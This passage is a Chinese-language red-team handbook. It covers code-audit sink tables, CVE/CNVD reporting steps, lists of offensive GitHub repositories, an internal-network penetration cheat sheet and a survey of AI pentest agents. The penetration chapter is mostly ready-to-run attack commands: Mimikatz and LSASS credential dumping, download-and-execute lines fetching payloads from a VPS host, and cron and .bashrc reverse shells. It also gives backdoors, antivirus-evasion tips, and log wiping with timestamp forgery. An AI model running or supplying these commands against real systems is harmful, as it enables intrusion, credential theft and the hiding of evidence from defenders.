| PHP | `eval()`, `system()`, `exec()`, `unserialize()` | RCE/反序列化 |
| PHP | `mysql_query()` + 字符串拼接 | SQL注入 |
| PHP | `include($var)`, `require($var)` | 文件包含 |
| Java | `Runtime.exec()`, `ProcessBuilder` | 命令执行 |
| Java | `ObjectInputStream.readObject()` | 反序列化 |
| Java | `SpelExpressionParser` | SpEL注入 |
| Python | `eval()`, `exec()`, `os.system()` | RCE |
| Python | `pickle.loads()`, `yaml.load()` | 反序列化 |
| Python | `render_template_string(user_input)` | SSTI |
| Go | `exec.Command()` + 用户输入 | 命令注入 |
| Node.js | `child_process.exec()` + 用户输入 | 命令执行 |
| Node.js | `eval(req.body)` | RCE |

### 18.7 提交流程

#### CVE 提交（MITRE）
1. 访问 https://cveform.mitre.org/
2. 填写英文漏洞描述
3. 附上 PoC + 影响版本
4. 等待分配 CVE 编号（1-4周）
5. 建议先报告给厂商等 90 天后再公开

#### CNVD 提交
1. 注册 https://www.cnvd.org.cn 账号
2. 提交漏洞 → 选"通用型"
3. 填写中文报告（用 cnvd_report_template.md）
4. 等待审核（3-15 工作日）
5. 通过后获得 CNVD 编号 + 证书

### 18.8 注意事项

- **先报告厂商** → 等回复 → 再提交 CVE/CNVD
- **不公开 0day** → 在厂商修复前不要发 Twitter/博客
- **截图留证** → 本地环境复现的全过程录屏
- **不攻击线上** → 所有验证在本地 Docker 环境完成
- **影响面统计** → 只用 FOFA 搜索计数，不实际攻击

---

*最后更新：2025-06*



---

## 十九、GitHub 红队笔记与工具资源汇总

> 来源：GitHub 开源社区精选，2025 年持续更新的高质量红队资源

### 19.1 综合攻防知识库（中文）

| 仓库 | Stars | 说明 | 链接 |
|------|-------|------|------|
| **Threekiii/Awesome-Redteam** | 3.4k+ | 最全中文攻防知识库，覆盖全生命周期 | https://github.com/Threekiii/Awesome-Redteam |
| **CnHack3r/Awesome-hacking-tools** | — | 黑客工具集：CVE利用/免杀/内网/Burp插件 | https://github.com/CnHack3r/Awesome-hacking-tools |
| **we1h0/redteam-tips** | — | 红队学习资料合集 | https://github.com/we1h0/redteam-tips |
| **F3eev/SharkExec** | 222 | 内网渗透 C# 内存加载 + CobaltStrike | https://github.com/F3eev/SharkExec |
| **JKme/cube** | — | 内网：弱密码爆破+信息收集+漏洞扫描 | https://github.com/JKme/cube |
| **Threekiii/Awesome-Exploit** | — | 漏洞利用工具仓库 | https://github.com/Threekiii/Awesome-Exploit |


#### Threekiii/Awesome-Redteam 目录结构

```
Awesome-Redteam/
├── cheatsheets/        # 速查表（端口服务、反弹shell、提权命令）
├── scripts/            # 实用脚本（shellcode加密、AV检测、密码生成）
├── tips/               # 专题笔记
│   ├── 内网渗透-免杀.md
│   ├── 内网渗透-横向移动.md
│   ├── 内网渗透-权限维持.md
│   ├── 信息搜集.md
│   └── ...
└── README.md           # 工具分类索引
```

**核心覆盖领域：**
- 信息搜集（子域名/端口/指纹/CDN绕过）
- 漏洞利用（Web/二进制/移动端）
- 内网渗透（横向移动/提权/隧道/免杀）
- 权限维持（后门/持久化/隐蔽通道）
- 痕迹清理
- 报告编写


#### ybdt 系列专题仓库

| 仓库 | 专注方向 | 链接 |
|------|---------|------|
| **ybdt/post-hub** | 后渗透（提权/横向/数据窃取） | https://github.com/ybdt/post-hub |
| **ybdt/evasion-hub** | 免杀对抗（AV/EDR绕过） | https://github.com/ybdt/evasion-hub |
| **ybdt/ops-hub** | 环境搭建/问题解决 | https://github.com/ybdt/ops-hub |

### 19.2 综合攻防知识库（英文）

| 仓库 | 说明 | 链接 |
|------|------|------|
| **A-poc/RedTeam-Tools** | 100+ 工具按 Kill Chain 分类 | https://github.com/A-poc/RedTeam-Tools |
| **0xsyr0/Red-Team-Playbooks** | 结构化红队剧本（侦察→窃取） | https://github.com/0xsyr0/Red-Team-Playbooks |
| **CyberSecurityUP/Awesome-Red-Team-Operations** | 红队操作全流程 | https://github.com/CyberSecurityUP/Awesome-Red-Team-Operations |
| **RistBS/Awesome-RedTeam-Cheatsheet** | 红队备忘录+Malware开发 | https://github.com/RistBS/Awesome-RedTeam-Cheatsheet |
| **dmcxblue/Red-Team-Notes** | 红队实验笔记 | https://github.com/dmcxblue/Red-Team-Notes |
| **threatexpress/red-team-scripts** | 红队脚本集合 | https://github.com/threatexpress/red-team-scripts |
| **an4kein/awesome-red-teaming** | 红队资源列表 | https://github.com/an4kein/awesome-red-teaming |
| **Astrosp/Awesome-OSINT-For-Everything** | OSINT 情报搜集大全 | https://github.com/Astrosp/Awesome-OSINT-For-Everything |


#### A-poc/RedTeam-Tools 工具分类

按 Cyber Kill Chain 7 阶段组织 100+ 工具：

```
1. Reconnaissance（侦察）
   → Nmap, Masscan, Amass, Subfinder, Shodan, FOFA

2. Weaponization（武器化）
   → msfvenom, Donut, ScareCrow, Nim 加载器

3. Delivery（投递）
   → GoPhish, Evilginx2, 钓鱼框架

4. Exploitation（利用）
   → Metasploit, SQLMap, XSStrike, Nuclei

5. Installation（安装）
   → Cobalt Strike, Sliver, Havoc C2

6. Command & Control（C2）
   → Cobalt Strike, Mythic, Covenant, Sliver

7. Exfiltration（数据窃取）
   → DNScat2, Cloakify, PacketWhisper
```

#### 0xsyr0/Red-Team-Playbooks 结构

```
Red-Team-Playbooks/
├── 1-Reconnaissance/        # OSINT + 主动侦察
├── 2-Resource-Development/  # 基础设施搭建
├── 3-Initial-Access/        # 初始突破（钓鱼/漏洞利用）
├── 4-Exploitation/
│   ├── 4.1-Privilege-Escalation.md   # 提权
│   ├── 4.2-Persistence.md           # 权限维持
│   ├── 4.3-Credential-Access.md     # 凭据获取
│   └── 4.4-Lateral-Movement.md      # 横向移动
├── 5-Post-Exploitation/     # 后渗透
└── 6-Exfiltration/          # 数据窃取
```


### 19.3 OSCP / 渗透认证备忘录

| 仓库 | 说明 | 链接 |
|------|------|------|
| **RustyShackleford221/Offensive-Security-OSCP-Cheatsheets** | OSCP 全套备忘录 | https://github.com/RustyShackleford221/Offensive-Security-OSCP-Cheatsheets |
| **blackc03r/OSCP-Cheatsheets** | 攻防实验+凭据转储 | https://github.com/blackc03r/OSCP-Cheatsheets |
| **jenriquezv/OSCP-Cheat-Sheets-AD** | Active Directory 专项 | https://github.com/jenriquezv/OSCP-Cheat-Sheets-AD |

### 19.4 ired.team 红队笔记（经典参考）

> https://www.ired.team — 最系统的红队技术参考站

核心内容：
- Windows 后渗透（凭据转储、Kerberos 攻击、Token 操纵）
- 代码注入技术（DLL注入、进程镂空、APC注入）
- 持久化技术（注册表、计划任务、WMI事件订阅）
- 免杀技术（AMSI绕过、ETW绕过、加壳混淆）
- Active Directory 攻击路径

### 19.5 推荐学习路径

```
新手入门：
  A-poc/RedTeam-Tools（了解工具全貌）
  → 0xsyr0/Red-Team-Playbooks（学习流程）
  → OSCP-Cheatsheets（动手练习）

中级进阶：
  Threekiii/Awesome-Redteam（中文深入）
  → ired.team（Windows 后渗透）
  → ybdt/evasion-hub（免杀对抗）

高级实战：
  内网渗透全链路
  → AI Agent 自动化（见第二十一章）
  → 自研工具开发
```



---

## 二十、内网渗透实战技术

> 融合 ired.team、Threekiii/Awesome-Redteam、0xsyr0/Red-Team-Playbooks、ybdt/post-hub 等社区精华

### 20.1 内网渗透总体流程

```
外网突破 → 建立据点 → 信息搜集 → 横向移动 → 域控攻击 → 数据窃取 → 痕迹清理
   │           │           │           │           │           │           │
   │     反弹shell    内网探测     Pass-the-Hash  Golden Ticket  打包外传   清日志
   │     Web shell    域信息      WMI/PSExec    DCSync         DNS隧道    改时间戳
   │     隧道搭建    凭据收集     RDP/SSH       Kerberoasting  HTTP隧道   删工具
```

### 20.2 建立据点 — 隧道与代理

#### 常用隧道工具

| 工具 | 协议 | 特点 | 命令示例 |
|------|------|------|---------|
| **frp** | TCP/UDP/HTTP | 国产首选，配置简单 | `./frpc -c frpc.ini` |
| **Chisel** | HTTP/SOCKS5 | 单二进制，过防火墙 | `chisel server -p 8080 --reverse` |
| **Neo-reGeorg** | HTTP | 基于 Web shell | `python neoreg.py generate -k pass` |
| **Stowaway** | TCP | 多级代理链 | `./admin -l 9999` |
| **iox** | TCP/UDP | 端口转发+SOCKS5 | `iox fwd -l 8888 -r 192.168.1.1:3389` |
| **EarthWorm (ew)** | SOCKS5 | 经典老牌 | `ew -s ssocksd -l 1080` |
| **Ligolo-ng** | TUN | 无需SOCKS代理 | `ligolo-agent -connect attacker:11601` |


#### frp 配置示例

```ini
# frpc.ini（客户端 - 内网机器）
[common]
server_addr = VPS_IP
server_port = 7000
token = your_token

[socks5]
type = tcp
remote_port = 1080
plugin = socks5

[rdp]
type = tcp
local_ip = 192.168.1.100
local_port = 3389
remote_port = 33389
```

#### Chisel 用法

```bash
# 攻击机（服务端）
chisel server -p 8080 --reverse

# 内网机器（客户端）— 反向 SOCKS5
chisel client ATTACKER_IP:8080 R:socks

# 然后在攻击机使用 proxychains 走 1080 端口
# /etc/proxychains.conf → socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 192.168.1.0/24
```

#### SSH 隧道（最通用）

```bash
# 本地端口转发（访问内网服务）
ssh -L 3389:192.168.1.100:3389 user@跳板机

# 远程端口转发（把内网端口暴露出来）
ssh -R 8080:127.0.0.1:80 user@VPS

# 动态端口转发（SOCKS5 代理）
ssh -D 1080 user@跳板机
```


### 20.3 内网信息搜集

#### Windows 域环境信息搜集

```powershell
# 基本信息
whoami /all                          # 当前用户+权限+组
hostname                             # 主机名
systeminfo                           # 系统详细信息
ipconfig /all                        # 网络配置
net user                             # 本地用户
net localgroup administrators        # 本地管理员组
net user /domain                     # 域用户列表
net group "Domain Admins" /domain    # 域管理员
net group "Domain Controllers" /domain  # 域控列表
nltest /dclist:域名                   # 域控 IP

# 域信息
net view                             # 查看当前域内机器
net view /domain                     # 查看所有域
net time /domain                     # 域控时间（确认域控）
nslookup -type=SRV _ldap._tcp.dc._msdcs.域名  # DNS 查域控

# 网络信息
arp -a                               # ARP 缓存（发现存活主机）
netstat -ano                         # 网络连接
route print                          # 路由表
net session                          # 当前会话
net share                            # 共享目录

# 进程/服务
tasklist /svc                        # 进程+对应服务
wmic process list brief              # WMIC 查进程
sc query                             # 服务列表
```

#### Linux 信息搜集

```bash
# 基本信息
id                                   # 当前用户
uname -a                             # 内核版本
cat /etc/os-release                  # 系统版本
ip addr                              # 网卡信息
ss -tlnp                             # 监听端口
ps aux                               # 进程列表
cat /etc/passwd                      # 用户列表
cat /etc/shadow                      # 密码哈希（需root）
crontab -l                           # 定时任务
find / -perm -4000 2>/dev/null       # SUID 文件
cat /etc/hosts                       # hosts 文件
cat ~/.bash_history                  # 命令历史
env                                  # 环境变量
mount                                # 挂载信息
```


#### 内网存活探测

```bash
# ICMP 探测（可能被防火墙拦截）
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i alive"; done

# ARP 探测（同网段最准确）
arp-scan -l
nmap -sn -PR 192.168.1.0/24

# NetBIOS 探测（Windows 环境）
nbtscan 192.168.1.0/24

# TCP 端口探测
nmap -sT -Pn -p 22,80,135,445,3389 192.168.1.0/24

# PowerShell 批量探测
1..254 | %{ $ip="192.168.1.$_"; if(Test-Connection -Count 1 -Quiet $ip){Write-Host "$ip alive"} }
```

### 20.4 凭据获取

#### Windows 凭据转储

| 工具 | 获取内容 | 命令 |
|------|---------|------|
| **Mimikatz** | 明文密码/NTLM Hash | `sekurlsa::logonpasswords` |
| **procdump** | LSASS 内存转储 | `procdump -ma lsass.exe lsass.dmp` |
| **comsvcs.dll** | LSASS 转储（免杀） | `rundll32 comsvcs.dll,MiniDump PID out.dmp full` |
| **SAM 导出** | 本地账户 Hash | `reg save HKLM\SAM sam.hiv` |
| **DCSync** | 域内所有 Hash | `lsadump::dcsync /domain:x /all` |
| **Kerberoasting** | 服务账号 Hash | `Rubeus kerberoast` |
| **NTDS.dit** | 域控全部 Hash | `ntdsutil + secretsdump.py` |


#### Mimikatz 常用命令

```
# 提升权限
privilege::debug

# 抓取明文密码和 NTLM Hash
sekurlsa::logonpasswords

# 导出所有 Kerberos 票据
sekurlsa::tickets /export

# 制作 Golden Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd

# DCSync（需域管权限）
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /all /csv
```

#### 免杀 LSASS 转储方法

```powershell
# 方法1: comsvcs.dll（系统自带，无需上传工具）
$pid = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\temp\out.dmp full

# 方法2: 任务管理器直接右键转储（GUI环境）

# 方法3: ProcDump（微软签名工具，不会被杀）
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# 方法4: PowerShell 反射加载 Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://VPS/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

# 方法5: nanodump（最新免杀方案）
nanodump.exe --write C:\temp\out.dmp
```

#### Linux 凭据获取

```bash
# /etc/shadow 破解
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=rockyou.txt combined.txt
hashcat -m 1800 shadow.hash rockyou.txt

# SSH 密钥搜集
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null

# 内存中的密码
strings /proc/*/maps | grep -i pass
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass

# 历史文件
cat ~/.bash_history | grep -i "pass\|ssh\|mysql\|ftp"
cat ~/.mysql_history
cat /var/log/auth.log | grep "password"

# Mimipenguin（Linux 版 Mimikatz）
python3 mimipenguin.py
```


### 20.5 横向移动

#### Windows 横向移动方法

| 方法 | 所需凭据 | 端口 | 命令/工具 |
|------|---------|------|----------|
| **PsExec** | 明文密码/Hash | 445 | `psexec.py DOMAIN/user:pass@target` |
| **WMI** | 明文密码/Hash | 135 | `wmiexec.py DOMAIN/user:pass@target` |
| **WinRM** | 明文密码/Hash | 5985/5986 | `evil-winrm -i target -u user -p pass` |
| **SMB** | 明文密码/Hash | 445 | `smbexec.py DOMAIN/user:pass@target` |
| **RDP** | 明文密码 | 3389 | `xfreerdp /v:target /u:user /p:pass` |
| **DCOM** | 明文密码/Hash | 135 | `dcomexec.py DOMAIN/user:pass@target` |
| **SSH** | 密码/密钥 | 22 | `ssh user@target` |
| **PTH** | NTLM Hash | 445 | `pth-winexe -U user%HASH //target cmd` |
| **PTT** | Kerberos 票据 | 88 | `Rubeus ptt /ticket:xxx` |

#### Impacket 套件（最常用）

```bash
# PsExec（最稳定，会创建服务）
python3 psexec.py CORP/admin:Password123@192.168.1.100
python3 psexec.py -hashes :NTLM_HASH CORP/admin@192.168.1.100

# WMI（不落盘，较隐蔽）
python3 wmiexec.py CORP/admin:Password123@192.168.1.100
python3 wmiexec.py -hashes :NTLM_HASH CORP/admin@192.168.1.100

# SMB（通过命名管道）
python3 smbexec.py CORP/admin:Password123@192.168.1.100

# ATExec（通过计划任务）
python3 atexec.py CORP/admin:Password123@192.168.1.100 "whoami"

# SecretsDump（远程导出凭据）
python3 secretsdump.py CORP/admin:Password123@DC_IP
```


#### CrackMapExec (CME) / NetExec — 批量横向

```bash
# 密码喷洒（找可登录的机器）
crackmapexec smb 192.168.1.0/24 -u admin -p Password123
crackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH

# 批量执行命令
crackmapexec smb targets.txt -u admin -p pass -x "whoami"

# 枚举共享
crackmapexec smb 192.168.1.0/24 -u admin -p pass --shares

# 枚举登录用户
crackmapexec smb 192.168.1.0/24 -u admin -p pass --sessions

# 导出 SAM
crackmapexec smb target -u admin -p pass --sam

# WinRM 执行
crackmapexec winrm 192.168.1.0/24 -u admin -p pass -x "whoami"
```

#### Linux 横向移动

```bash
# SSH 密钥复用（拿到私钥后）
ssh -i stolen_id_rsa user@next_target

# SSH 代理转发（一跳一跳走）
ssh -A user@jump_host    # 启用 agent forwarding
ssh next_target          # 自动使用前一跳的密钥

# 通过 NFS 共享
showmount -e target_ip
mount -t nfs target_ip:/share /mnt/

# 通过 Redis 未授权
redis-cli -h target_ip
# 写 SSH 公钥
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa AAAA...公钥...\n\n"
SAVE

# 通过 Docker 逃逸（宿主机挂载）
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```


### 20.6 权限提升

#### Windows 提权

| 方法 | 条件 | 工具/命令 |
|------|------|----------|
| **Potato 系列** | SeImpersonate 权限 | JuicyPotato/SweetPotato/GodPotato |
| **PrintSpoofer** | SeImpersonate + Win10 | `PrintSpoofer.exe -i -c cmd` |
| **内核漏洞** | 未打补丁 | systeminfo → Windows-Exploit-Suggester |
| **服务路径未引用** | 服务配置不当 | `wmic service get name,pathname` |
| **DLL 劫持** | 可写的 DLL 搜索路径 | Process Monitor 监控 |
| **AlwaysInstallElevated** | 注册表配置 | `msiexec /i evil.msi` |
| **计划任务** | 可写的任务脚本 | `schtasks /query /fo LIST /v` |
| **Token 窃取** | 管理员进程 | `incognito list_tokens -u` |
| **UAC 绕过** | 管理员组低完整性 | UACME / FodHelper |

```powershell
# 自动化提权枚举
# WinPEAS
.\winPEASx64.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# SharpUp
.\SharpUp.exe audit

# Windows-Exploit-Suggester
systeminfo > sysinfo.txt
python3 windows-exploit-suggester.py --database 2025-01.xlsx --systeminfo sysinfo.txt
```

#### Linux 提权

| 方法 | 条件 | 命令/工具 |
|------|------|----------|
| **SUID 利用** | 危险 SUID 程序 | GTFOBins 查找 |
| **内核漏洞** | 未打补丁 | linux-exploit-suggester |
| **Sudo 配置** | sudo 规则不当 | `sudo -l` |
| **Capabilities** | 危险 cap | `getcap -r / 2>/dev/null` |
| **Cron 任务** | 可写的定时脚本 | `cat /etc/crontab` |
| **Docker 组** | 用户在 docker 组 | `docker run -v /:/mnt alpine` |
| **PATH 劫持** | 相对路径调用 | 写恶意同名程序 |
| **NFS no_root_squash** | NFS 配置不当 | 远程写 SUID shell |
| **Writable /etc/passwd** | 密码文件可写 | 添加 root 用户 |


```bash
# Linux 自动化提权枚举
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# linux-exploit-suggester
./linux-exploit-suggester.sh

# LinEnum
./LinEnum.sh -t

# SUID 查找 + GTFOBins 对照
find / -perm -4000 -type f 2>/dev/null
# 常见可利用 SUID：
#   /usr/bin/find → find . -exec /bin/sh \;
#   /usr/bin/vim → vim -c ':!/bin/sh'
#   /usr/bin/python → python -c 'import os;os.setuid(0);os.system("/bin/sh")'
#   /usr/bin/nmap → nmap --interactive → !sh (旧版)
#   /usr/bin/env → env /bin/sh

# Sudo 利用
sudo -l
# 如果有 (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'
# 如果有 (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/sh \; -quit
```

### 20.7 权限维持（持久化）

#### Windows 持久化

| 方法 | 隐蔽性 | 操作 |
|------|--------|------|
| **注册表 Run 键** | 低 | `reg add HKCU\...\Run /v name /d payload` |
| **计划任务** | 中 | `schtasks /create /sc onlogon /tr payload` |
| **WMI 事件订阅** | 高 | 永久事件消费者绑定 |
| **DLL 劫持** | 高 | 替换系统常用 DLL |
| **服务创建** | 中 | `sc create svcname binpath= payload` |
| **Golden Ticket** | 极高 | krbtgt Hash → 10年有效域管 |
| **Silver Ticket** | 高 | 服务账号 Hash → 访问特定服务 |
| **Shadow Credentials** | 高 | 修改 msDS-KeyCredentialLink |
| **DSRM 后门** | 极高 | 修改 DSRM 密码策略 |
| **Skeleton Key** | 高 | 域控注入万能密码 |
| **AdminSDHolder** | 高 | ACL 持久化 |


```powershell
# 注册表持久化
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\temp\payload.exe"

# 计划任务持久化
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\payload.exe" /sc onlogon /ru SYSTEM

# WMI 事件订阅（最隐蔽，无文件）
# 使用 PowerShell 创建永久 WMI 事件
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = 'BotFilter'; EventNameSpace = 'root\cimv2';
    QueryLanguage = 'WQL';
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
    Name = 'BotConsumer'; CommandLineTemplate = 'C:\temp\payload.exe'
}
Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter; Consumer = $Consumer
}

# Skeleton Key（域控注入，所有用户可用万能密码）
# Mimikatz: misc::skeleton
# 之后任何用户可用密码 "mimikatz" 登录
```

#### Linux 持久化

```bash
# SSH 公钥后门
echo "ssh-rsa AAAA...你的公钥..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Cron 反弹 shell
echo "* * * * * bash -c 'bash -i >& /dev/tcp/VPS_IP/4444 0>&1'" >> /var/spool/cron/root
# 或
echo "* * * * * /tmp/.hidden_shell" > /etc/cron.d/update

# .bashrc 后门（用户登录触发）
echo 'bash -i >& /dev/tcp/VPS_IP/4444 0>&1 &' >> /root/.bashrc

# SUID 后门
cp /bin/bash /tmp/.suid_bash
chmod u+s /tmp/.suid_bash
# 触发: /tmp/.suid_bash -p

# PAM 后门（万能密码）
# 修改 pam_unix.so，硬编码一个后门密码

# LD_PRELOAD 后门
echo "/tmp/evil.so" > /etc/ld.so.preload

# Systemd 服务后门
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update
[Service]
ExecStart=/tmp/.backdoor
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```


### 20.8 域渗透攻击路径

#### Kerberos 攻击

```
┌─────────────────────────────────────────────────────────┐
│                Kerberos 攻击总览                          │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  AS-REP Roasting ← 不要求预认证的账户                    │
│       ↓                                                 │
│  Kerberoasting ← 有 SPN 的服务账户                      │
│       ↓                                                 │
│  Silver Ticket ← 服务账户 Hash                          │
│       ↓                                                 │
│  Golden Ticket ← krbtgt Hash（拿下域控后）              │
│       ↓                                                 │
│  Diamond Ticket ← 修改真实 TGT（最隐蔽）               │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

```bash
# AS-REP Roasting（不需任何凭据）
python3 GetNPUsers.py CORP.LOCAL/ -dc-ip DC_IP -usersfile users.txt -format hashcat

# Kerberoasting（需要域用户凭据）
python3 GetUserSPNs.py CORP.LOCAL/user:pass -dc-ip DC_IP -request
# 破解：
hashcat -m 13100 kerberoast.hash rockyou.txt

# DCSync（需要域管或复制权限）
python3 secretsdump.py CORP/admin:pass@DC_IP

# Golden Ticket 制作
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain CORP.LOCAL Administrator
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass CORP.LOCAL/Administrator@DC_IP
```

#### AD 攻击工具速查

| 工具 | 用途 | 链接 |
|------|------|------|
| **BloodHound** | AD 攻击路径可视化 | https://github.com/BloodHoundAD/BloodHound |
| **Impacket** | Python AD 协议套件 | https://github.com/fortra/impacket |
| **Rubeus** | Kerberos 攻击工具 | https://github.com/GhostPack/Rubeus |
| **Certify** | ADCS 证书攻击 | https://github.com/GhostPack/Certify |
| **Certipy** | Python 版 ADCS 攻击 | https://github.com/ly4k/Certipy |
| **SharpHound** | BloodHound 数据采集 | BloodHound 内置 |
| **PowerView** | PowerShell AD 枚举 | PowerSploit 套件 |
| **ADModule** | .NET AD 模块 | https://github.com/samratashok/ADModule |


### 20.9 免杀对抗基础

#### 免杀方法分类

| 方法 | 原理 | 工具 |
|------|------|------|
| **加壳/加密** | 改变特征码 | UPX/VMProtect/Themida |
| **Shellcode 加载器** | 分离免杀 | C/Go/Rust/Nim 自写加载器 |
| **内存加载** | 不落盘 | 反射DLL/Donut/BOF |
| **AMSI 绕过** | 禁用脚本扫描 | 内存 Patch amsi.dll |
| **ETW 绕过** | 禁用日志追踪 | Patch EtwEventWrite |
| **签名伪造** | 假冒合法签名 | SigThief |
| **白名单利用** | LOLBins | rundll32/mshta/certutil |
| **间接系统调用** | 绕过 hook | SysWhispers/HellsGate |

#### LOLBins（Living off the Land）常用

```powershell
# certutil 下载文件
certutil -urlcache -split -f http://VPS/payload.exe C:\temp\payload.exe

# mshta 执行 HTA
mshta http://VPS/evil.hta

# rundll32 执行 DLL
rundll32 shell32.dll,Control_RunDLL payload.dll

# regsvr32 无文件执行
regsvr32 /s /n /u /i:http://VPS/evil.sct scrobj.dll

# bitsadmin 下载
bitsadmin /transfer job /download /priority high http://VPS/payload.exe C:\temp\payload.exe

# PowerShell 下载执行
powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://VPS/ps.ps1')"

# wmic 远程执行
wmic /node:target process call create "cmd /c payload.exe"
```

### 20.10 痕迹清理

```powershell
# Windows 清理
wevtutil cl Security        # 清安全日志
wevtutil cl System          # 清系统日志
wevtutil cl Application     # 清应用日志
del /f /q %USERPROFILE%\AppData\Local\Temp\*  # 清临时文件
# 修改文件时间戳
powershell (Get-Item file.exe).LastWriteTime = '2023-01-01 08:00:00'
```

```bash
# Linux 清理
echo > /var/log/auth.log     # 清认证日志
echo > /var/log/syslog       # 清系统日志
echo > /var/log/wtmp         # 清登录记录
echo > /var/log/lastlog      # 清最后登录
echo > ~/.bash_history       # 清命令历史
history -c                   # 清当前会话历史
unset HISTFILE               # 不记录后续命令
# 修改文件时间戳
touch -r /etc/passwd /tmp/backdoor  # 与参考文件同时间
```



---

## 二十一、AI 驱动渗透测试工具（2025-2026 最新）

> 来源：GitHub 开源社区、appsecsanta.com 研究报告、各项目官方文档
> 截至 2026 年，已有 39+ 开源 AI 渗透 Agent 项目，覆盖 6 种架构模式

### 21.1 AI 渗透工具全景图

```
AI 渗透测试工具生态（2025-2026）
├── 单 Agent 架构
│   ├── AI-OPS（开源 LLM）
│   └── Auto-Pentest-GPT-AI（Armur-Ai）
│
├── 多 Agent Planner-Executor 架构
│   ├── PentAGI（全自主，Docker 隔离）
│   └── pentest-agent（学术论文级）
│
├── 专业角色分工架构
│   ├── Pentest-Swarm-AI（侦察/分类/利用/报告 4 专家）
│   └── pentest-agent-system（MITRE ATT&CK 映射）
│
├── 群体智能（Swarm）架构
│   └── Pentest-Swarm-AI（Go + Claude API）
│
├── MCP Server 架构
│   ├── HexStrike AI（70+ 工具 MCP）
│   ├── PentestAgent（GH05TCREW）
│   └── pentest-ai（0xSteph，197+ 工具）
│
└── Claude Code Native 架构
    ├── pentest-ai-agents（31 专业子 Agent）
    └── Bai-codeagent（本项目）
```

### 21.2 重点项目详解

#### PentAGI — 全自主 AI 渗透系统

| 属性 | 值 |
|------|---|
| **仓库** | https://github.com/vxcontrol/pentagi |
| **架构** | 多 Agent + Docker 隔离执行环境 |
| **语言** | Go + TypeScript |
| **LLM** | 支持 OpenAI/Claude/本地模型 |
| **特点** | 全自主决策、任务分解、工具自动调用、Web UI |

核心能力：
- 自主规划渗透路径
- Docker 容器内安全执行命令
- 上下文记忆 + 任务链管理
- 结果自动分析和报告生成
- Web 界面实时监控进度


#### Pentest-Swarm-AI — 群体智能渗透

| 属性 | 值 |
|------|---|
| **仓库** | https://github.com/Armur-Ai/Pentest-Swarm-AI |
| **架构** | Swarm 多 Agent + ReAct 推理 |
| **语言** | Go |
| **LLM** | Claude API |
| **模式** | Bug Bounty / 持续监控 / CTF |

Agent 角色分工：
```
┌────────────────────────────────────────────────┐
│              Orchestrator（编排者）              │
├────────────────────────────────────────────────┤
│  Recon Agent     → 侦察（子域名/端口/指纹）    │
│  Classifier Agent → 资产分类 + 优先级排序       │
│  Exploit Agent   → 漏洞利用 + PoC 验证         │
│  Report Agent    → 报告生成 + 修复建议          │
└────────────────────────────────────────────────┘
```

特色：
- ReAct（Reasoning + Acting）推理循环
- 7+ 内置安全工具原生集成
- 支持 Bug Bounty、持续监控、CTF 三种模式
- Go 语言高并发性能

#### GH05TCREW/PentestAgent — MCP 架构工具箱

| 属性 | 值 |
|------|---|
| **仓库** | https://github.com/GH05TCREW/PentestAgent |
| **架构** | MCP Server + RAG 知识库 |
| **集成工具** | Nmap, Metasploit, FFUF, SQLMap, Hydra |
| **模式** | 辅助对话 / 自主 Agent / 多Agent Crew |
| **界面** | TUI（终端用户界面） |

核心能力：
- 预置攻击 Playbook（自动化攻击序列）
- RAG 本地知识库（OWASP/CVE/漏洞利用文档）
- MCP 协议连接外部工具
- Chromium 浏览器实例（Playwright Web 漏洞测试）
- 自主决策下一步操作


#### HexStrike AI — 70+ 工具 MCP Server

| 属性 | 值 |
|------|---|
| **仓库** | https://github.com/0x4m4/hexstrike-ai |
| **架构** | MCP Server（让任何 AI Agent 调用安全工具） |
| **兼容** | Claude Desktop / Cursor / GPT / Copilot |
| **工具数** | 70+ 安全工具 |

工具分类：
- 侦察：Nmap, Amass, Subfinder, WHOIS
- Web 扫描：Nikto, WhatWeb, Wappalyzer
- 漏洞扫描：Nuclei, SQLMap, XSStrike
- 爆破：Hydra, Hashcat, John
- 后渗透：LinPEAS, WinPEAS
- 网络：Wireshark, TCPDump
- 密码学：CyberChef

#### 0xSteph/pentest-ai — 197+ 工具最全 MCP

| 属性 | 值 |
|------|---|
| **仓库** | https://github.com/0xSteph/pentest-ai |
